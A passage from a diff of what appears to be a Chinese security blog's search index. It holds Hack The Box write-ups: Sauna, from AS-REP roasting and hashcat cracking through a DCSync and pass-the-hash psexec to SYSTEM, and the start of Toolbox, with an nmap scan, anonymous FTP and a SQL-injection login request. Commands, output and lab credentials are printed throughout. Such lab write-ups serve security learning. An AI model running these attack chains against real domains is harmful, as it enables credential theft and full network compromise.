+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问80端口发现一个网站，在&#x2F;about 上可以看到一些用户名</p>
+<img src="/Hackthebox/htb/htb-sauna/image-20250322153810191.png" class="" title="用户名收集">
+
+
+
+<p>收集页面上的用户名</p>
+<pre class="language-none"><code class="language-none">Fergus Smith
+Shaun Coins
+Hugo Bear
+Bowie Taylor
+Sophie Driver
+Steven Kerb</code></pre>
+
+<p>根据用户名重新生成用户名组合</p>
+<pre class="language-none"><code class="language-none">$ .&#x2F;username-anarchy --input-file user.txt --select-format first,flast,first.last firstl &gt; username.txt    </code></pre>
+
+<pre class="language-none"><code class="language-none">firstl
+fergus
+fergus.smith
+fsmith
+shaun
+shaun.coins
+scoins
+hugo
+hugo.bear
+hbear
+bowie
+bowie.taylor
+btaylor
+sophie
+sophie.driver
+sdriver
+steven
+steven.kerb
+skerb</code></pre>
+
+<h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>使用 impacket-GetNPUsers </p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip <span class="token number">10.10</span>.10.175 <span class="token parameter variable">-usersfile</span> username.txt -no-pass 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
+<span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$fsmith</span>@EGOTISTICAL-BANK.LOCAL:139d477d158ddd194616ff3f5568be1a<span class="token variable">$30b7b9edf20400313d31252b04ee37223a106f79c2d7432fe6f0bf421560f31c7fc566ae368e479428ae09f12a5f86926427ac033248ff05f0ef514574ebd4721f533c79add45bd1b010903e58fb3aeca94f58333811b69ef70346ad227828e5fa36a7d54f4534c51830e7746b5ae87c75dc5c9c4813161eda621fec33235f4872488395fb674c0a154d4fe83892cb301bbaefcef1c3c4ff287e2a4f7903807d08694adcf89d7eb820afaf3ab45440ff68b1bb99385cc8ded853bce4908e7b1e1d669d9f82aca5020be559f060559e78828f3f33c48a4051aef7b8316caa375498b544290d032baf45db2d62e0779ee44f9fb0589ec46f44418ecc0399b16703</span>
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>
+
+<p>使用hashcat 破解</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ hashcat <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">18200</span> <span class="token builtin class-name">hash</span> /usr/share/wordlists/rockyou.txt
+hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting
+
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+Watchdog: Temperature abort trigger <span class="token builtin class-name">set</span> to 90c
+
+Host memory required <span class="token keyword">for</span> this attack: <span class="token number">52</span> MB
+
+Dictionary cache hit:
+* Filename<span class="token punctuation">..</span>: /usr/share/wordlists/rockyou.txt
+* Passwords.: <span class="token number">14344385</span>
+* Bytes<span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">139921507</span>
+* Keyspace<span class="token punctuation">..</span>: <span class="token number">14344385</span>
+
+<span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$fsmith</span>@EGOTISTICAL-BANK.LOCAL:139d477d158ddd194616ff3f5568be1a<span class="token variable">$30b7b9edf20400313d31252b04ee37223a106f79c2d7432fe6f0bf421560f31c7fc566ae368e479428ae09f12a5f86926427ac033248ff05f0ef514574ebd4721f533c79add45bd1b010903e58fb3aeca94f58333811b69ef70346ad227828e5fa36a7d54f4534c51830e7746b5ae87c75dc5c9c4813161eda621fec33235f4872488395fb674c0a154d4fe83892cb301bbaefcef1c3c4ff287e2a4f7903807d08694adcf89d7eb820afaf3ab45440ff68b1bb99385cc8ded853bce4908e7b1e1d669d9f82aca5020be559f060559e78828f3f33c48a4051aef7b8316caa375498b544290d032baf45db2d62e0779ee44f9fb0589ec46f44418ecc0399b16703</span>:Thestrokes23
+                                                          
+Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
+Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Cracked
+Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">18200</span> <span class="token punctuation">(</span>Kerberos <span class="token number">5</span>, etype <span class="token number">23</span>, AS-REP<span class="token punctuation">)</span>
+Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$fsmith</span>@EGOTISTICAL-BANK.LOCAL:139d477<span class="token punctuation">..</span>.b16703
+Time.Started<span class="token punctuation">..</span><span class="token punctuation">..</span>.: Sat Mar <span class="token number">22</span> <span class="token number">16</span>:45:56 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">2</span> secs<span class="token punctuation">)</span>
+Time.Estimated<span class="token punctuation">..</span>.: Sat Mar <span class="token number">22</span> <span class="token number">16</span>:45:58 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">0</span> secs<span class="token punctuation">)</span>
+Kernel.Feature<span class="token punctuation">..</span>.: Pure Kernel
+Guess.Base<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: File <span class="token punctuation">(</span>/usr/share/wordlists/rockyou.txt<span class="token punctuation">)</span>
+Guess.Queue<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
+Speed.<span class="token comment">#1.........:  7849.5 kH/s (9.73ms) @ Accel:1024 Loops:1 Thr:32 Vec:1</span>
+Recovered<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>total<span class="token punctuation">)</span>, <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>new<span class="token punctuation">)</span>
+Progress<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">10616832</span>/14344385 <span class="token punctuation">(</span><span class="token number">74.01</span>%<span class="token punctuation">)</span>
+Rejected<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">0</span>/10616832 <span class="token punctuation">(</span><span class="token number">0.00</span>%<span class="token punctuation">)</span>
+Restore.Point<span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">10420224</span>/14344385 <span class="token punctuation">(</span><span class="token number">72.64</span>%<span class="token punctuation">)</span>
+Restore.Sub.<span class="token comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span>
+Candidate.Engine.: Device Generator
+Candidates.<span class="token comment">#1....: aaron822 -> Saboka54</span>
+Hardware.Mon.<span class="token comment">#1..: Temp: 44c Util: 50% Core:1771MHz Mem:3504MHz Bus:8</span>
+
+Started: Sat Mar <span class="token number">22</span> <span class="token number">16</span>:45:43 <span class="token number">2025</span>
+Stopped: Sat Mar <span class="token number">22</span> <span class="token number">16</span>:45:59 <span class="token number">2025</span>
+</code></pre>
+
+<p>使用evil-winrm 登录目标</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ evil-winrm <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.10.175 <span class="token parameter variable">-u</span> fsmith  <span class="token parameter variable">-p</span> Thestrokes23 
+                                        
+Evil-WinRM shell v3.7
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>                                       
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FSmith<span class="token punctuation">\</span>Documents<span class="token operator">></span> 
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FSmith<span class="token punctuation">\</span>desktop<span class="token operator">></span> <span class="token function">dir</span>
+    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FSmith<span class="token punctuation">\</span>desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        <span class="token number">3</span>/22/2025   <span class="token number">6</span>:49 AM             <span class="token number">34</span> user.txt
+</code></pre>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>上传winPEASany.exe并运行。可以找到凭证</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FSmith<span class="token punctuation">\</span>Documents<span class="token operator">></span> .<span class="token punctuation">\</span>winPEASany.exe
+ANSI color bit <span class="token keyword">for</span> Windows is not set. If you are executing this from a Windows terminal inside the <span class="token function">host</span> you should run <span class="token string">'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1'</span> and <span class="token keyword">then</span> start a new CMD
+Long paths are disabled, so the maximum length of a path supported is <span class="token number">260</span> chars <span class="token punctuation">(</span>this may cause <span class="token boolean">false</span> negatives when looking <span class="token keyword">for</span> files<span class="token punctuation">)</span>. If you are admin, you can <span class="token builtin class-name">enable</span> it with <span class="token string">'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1'</span> and <span class="token keyword">then</span> start a new CMD
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking <span class="token keyword">for</span> AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             <span class="token builtin class-name">:</span>  EGOTISTICALBANK
+    DefaultUserName               <span class="token builtin class-name">:</span>  EGOTISTICALBANK<span class="token punctuation">\</span>svc_loanmanager
+    DefaultPassword               <span class="token builtin class-name">:</span>  Moneymakestheworldgoround<span class="token operator">!</span>
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>
+
+<p>使用Bloodhound分析域信息</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ bloodhound-python   <span class="token parameter variable">-u</span> fsmith  <span class="token parameter variable">-p</span> Thestrokes23  <span class="token parameter variable">-d</span> EGOTISTICAL-BANK.LOCAL <span class="token parameter variable">-ns</span> <span class="token number">10.10</span>.10.175  <span class="token parameter variable">-c</span> all <span class="token parameter variable">--zip</span>
+INFO: BloodHound.py <span class="token keyword">for</span> BloodHound LEGACY <span class="token punctuation">(</span>BloodHound <span class="token number">4.2</span> and <span class="token number">4.3</span><span class="token punctuation">)</span>
+INFO: Found AD domain: egotistical-bank.local
+INFO: Getting TGT <span class="token keyword">for</span> user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="token punctuation">[</span>Errno Connection error <span class="token punctuation">(</span>SAUNA.EGOTISTICAL-BANK.LOCAL:88<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>Errno -2<span class="token punctuation">]</span> Name or <span class="token function">service</span> not known
+INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
+INFO: Found <span class="token number">1</span> domains
+INFO: Found <span class="token number">1</span> domains <span class="token keyword">in</span> the forest
+INFO: Found <span class="token number">1</span> computers
+INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
+INFO: Found <span class="token number">7</span> <span class="token function">users</span>
+INFO: Found <span class="token number">52</span> <span class="token function">groups</span>
+INFO: Found <span class="token number">3</span> gpos
+INFO: Found <span class="token number">1</span> ous
+INFO: Found <span class="token number">19</span> containers
+INFO: Found <span class="token number">0</span> trusts
+INFO: Starting computer enumeration with <span class="token number">10</span> workers
+INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
+INFO: Done <span class="token keyword">in</span> 00M 36S
+INFO: Compressing output into 20250322171023_bloodhound.zip
+</code></pre>
+
+<img src="/Hackthebox/htb/htb-sauna/image-20250322171839977.png" class="" title="Bloodhound">
+
+<h3 id="DCsync-attack"><a href="#DCsync-attack" class="headerlink" title="DCsync attack"></a>DCsync attack</h3><p>使用impacket-secretsdump 进行DCSync attack </p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ impacket-secretsdump  <span class="token string">'EGOTISTICAL-BANK/svc_loanmgr@10.10.10.175'</span>  -just-dc-user Administrator 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping Domain Credentials <span class="token punctuation">(</span>domain<span class="token punctuation">\</span>uid:rid:lmhash:nthash<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+Administrator:des-cbc-md5:fb8f321c64cea87f
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cleaning up<span class="token punctuation">..</span>. 
+</code></pre>
+
+<p>使用impacket-psexec 登录目标，获得系统权限</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ impacket-psexec <span class="token string">'EGOTISTICAL-BANK/Administrator@10.10.10.175'</span> <span class="token parameter variable">-hashes</span> <span class="token string">'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e'</span> 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Requesting shares on <span class="token number">10.10</span>.10.175<span class="token punctuation">..</span><span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found writable share ADMIN$
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploading <span class="token function">file</span> eVKpxetW.exe
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Opening SVCManager on <span class="token number">10.10</span>.10.175<span class="token punctuation">..</span><span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating <span class="token function">service</span> dRDK on <span class="token number">10.10</span>.10.175<span class="token punctuation">..</span><span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting <span class="token function">service</span> dRDK<span class="token punctuation">..</span><span class="token punctuation">..</span>.
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Press <span class="token builtin class-name">help</span> <span class="token keyword">for</span> extra shell commands
+Microsoft Windows <span class="token punctuation">[</span>Version <span class="token number">10.0</span>.17763.973<span class="token punctuation">]</span>
+<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2018</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token function">whoami</span>
+nt authority<span class="token punctuation">\</span>system
+</code></pre>
+
+<table>
+<thead>
+<tr>
+<th align="left">Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Flag1</td>
+<td align="left">C:\Users\FSmith\Desktop\user.txt</td>
+</tr>
+<tr>
+<td align="left">Flag2</td>
+<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Shocker</title>
     <url>/Hackthebox/htb/htb-shocker/</url>
-    <content><![CDATA[<style>.dxqvsktplzld{zoom:50%;}</style><img src="/Hackthebox/htb/htb-shocker/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="dxqvsktplzld">
+    <content><![CDATA[<style>.mycrligtqsui{zoom:50%;}</style><img src="/Hackthebox/htb/htb-shocker/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="mycrligtqsui">
 
 <span id="more"></span>
 
@@ -2118,7 +2680,7 @@ meterpreter <span class="token operator">></span>
   <entry>
     <title>HTB-Tenten</title>
     <url>/Hackthebox/htb/htb-tenten/</url>
-    <content><![CDATA[<style>.ijtwsitypbdo{zoom:50%;}</style><img src="/Hackthebox/htb/htb-tenten/e58a465e93364c423cd2162945f8f7bf.png" class="ijtwsitypbdo">
+    <content><![CDATA[<style>.hqhdjsvhcdtf{zoom:50%;}</style><img src="/Hackthebox/htb/htb-tenten/e58a465e93364c423cd2162945f8f7bf.png" class="hqhdjsvhcdtf">
 
 <span id="more"></span>
 
@@ -2193,6 +2755,355 @@ meterpreter <span class="token operator">></span>
       <tags>
         <tag>CVE</tag>
         <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB-Toolbox</title>
+    <url>/Hackthebox/htb/htb-toolbox/</url>
+    <content><![CDATA[<style>.dmcccgyjiihz{zoom:50%;}</style><img src="/Hackthebox/htb/htb-toolbox/9d218e64149bfb00a002d94868f2e4b1.png" class="dmcccgyjiihz">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th align="left">OS</th>
+<th align="left">Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Windows</td>
+<td align="left">Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.236 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span>  tun0
+Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-21 <span class="token number">23</span>:36 CST
+Warning: <span class="token number">10.10</span>.10.236 giving up on port because retransmission cap hit <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>.
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.236
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.18s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65521</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT      STATE SERVICE       VERSION
+<span class="token number">21</span>/tcp    <span class="token function">open</span>  <span class="token function">ftp</span>           FileZilla ftpd <span class="token number">0.9</span>.60 beta
+<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
+<span class="token operator">|</span>_-r-xr-xr-x <span class="token number">1</span> <span class="token function">ftp</span> <span class="token function">ftp</span>      <span class="token number">242520560</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> docker-toolbox.exe
+<span class="token operator">|</span> ftp-syst: 
+<span class="token operator">|</span>_  SYST: UNIX emulated by FileZilla
+<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>           OpenSSH for_Windows_7.7 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">2048</span> 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
+<span class="token number">443</span>/tcp   <span class="token function">open</span>  ssl/http      Apache httpd <span class="token number">2.4</span>.38 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
+<span class="token operator">|</span>_http-server-header: Apache/2.4.38 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
+<span class="token operator">|</span> tls-alpn: 
+<span class="token operator">|</span>_  http/1.1
+<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
+<span class="token operator">|</span>_http-title: MegaLogistics
+<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>admin.megalogistic.com/organizationName<span class="token operator">=</span>MegaLogistic Ltd/stateOrProvinceName<span class="token operator">=</span>Some-State/countryName<span class="token operator">=</span>GR
+<span class="token operator">|</span> Not valid before: <span class="token number">2020</span>-02-18T17:45:56
+<span class="token operator">|</span>_Not valid after:  <span class="token number">2021</span>-02-17T17:45:56
+<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
+<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: Not Found
+<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="token number">47001</span>/tcp <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="token operator">|</span>_http-title: Not Found
+<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49665</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49666</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49668</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49669</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+<span class="token operator">|</span> smb2-time: 
+<span class="token operator">|</span>   date: <span class="token number">2025</span>-03-21T15:20:37
+<span class="token operator">|</span>_  start_date: N/A
+<span class="token operator">|</span>_clock-skew: <span class="token parameter variable">-18m24s</span>
+<span class="token operator">|</span> smb2-security-mode: 
+<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
+<span class="token operator">|</span>_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">180.71</span> seconds
+                                                                                         </code></pre>
+
+<p>在443端口发现<code>admin.megalogistic.com</code>，添加本地域名解析</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.236  admin.megalogistic.com'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>
+
+<p>ftp 允许匿名登录，登录后可以发现 docker-toolbox.exe</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ftp</span> <span class="token number">10.10</span>.10.236 
+Connected to <span class="token number">10.10</span>.10.236.
+<span class="token number">220</span>-FileZilla Server <span class="token number">0.9</span>.60 beta
+<span class="token number">220</span>-written by Tim Kosse <span class="token punctuation">(</span>tim.kosse@filezilla-project.org<span class="token punctuation">)</span>
+<span class="token number">220</span> Please visit https://filezilla-project.org/
+Name <span class="token punctuation">(</span><span class="token number">10.10</span>.10.236:kali<span class="token punctuation">)</span>: Anonymous
+<span class="token number">331</span> Password required <span class="token keyword">for</span> anonymous
+Password: 
+<span class="token number">230</span> Logged on
+Remote system <span class="token builtin class-name">type</span> is UNIX.
+Using binary mode to transfer files.
+ftp<span class="token operator">></span> <span class="token function">dir</span>
+<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">55341</span><span class="token operator">|</span><span class="token punctuation">)</span>
+<span class="token number">150</span> Opening data channel <span class="token keyword">for</span> directory listing of <span class="token string">"/"</span>
+-r-xr-xr-x <span class="token number">1</span> <span class="token function">ftp</span> <span class="token function">ftp</span>      <span class="token number">242520560</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> docker-toolbox.exe
+<span class="token number">226</span> Successfully transferred <span class="token string">"/"</span>
+ftp<span class="token operator">></span> get docker-toolbox.exe
+local: docker-toolbox.exe remote: docker-toolbox.exe
+<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">63234</span><span class="token operator">|</span><span class="token punctuation">)</span>
+<span class="token number">150</span> Opening data channel <span class="token keyword">for</span> <span class="token function">file</span> download from server of <span class="token string">"/docker-toolbox.exe"</span>
+<span class="token number">100</span>% <span class="token operator">|</span>*****************************************************<span class="token operator">|</span>   <span class="token number">231</span> MiB  <span class="token number">617.76</span> KiB/s    00:00 ETA
+<span class="token number">226</span> Successfully transferred <span class="token string">"/docker-toolbox.exe"</span>
+<span class="token number">242520560</span> bytes received <span class="token keyword">in</span> 06:23 <span class="token punctuation">(</span><span class="token number">617.76</span> KiB/s<span class="token punctuation">)</span>
+</code></pre>
+
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>访问<code>admin.megalogistic.com</code>，使用burp 抓取登录数据，使用sqlmap测试，存在sql注入</p>
+<img src="/Hackthebox/htb/htb-toolbox/image-20250322104959280.png" class="" title="登录">
+
+<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">admin.megalogistic.com</span></span>
+<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=21c7525f49e68a4f7653422a03ddecfe</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">35</span></span>
+<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua</span><span class="token punctuation">:</span> <span class="token header-value">"Chromium";v="133", "Not(A:Brand";v="99"</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Mobile</span><span class="token punctuation">:</span> <span class="token header-value">?0</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Platform</span><span class="token punctuation">:</span> <span class="token header-value">"Linux"</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
+<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">https://admin.megalogistic.com</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
+<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
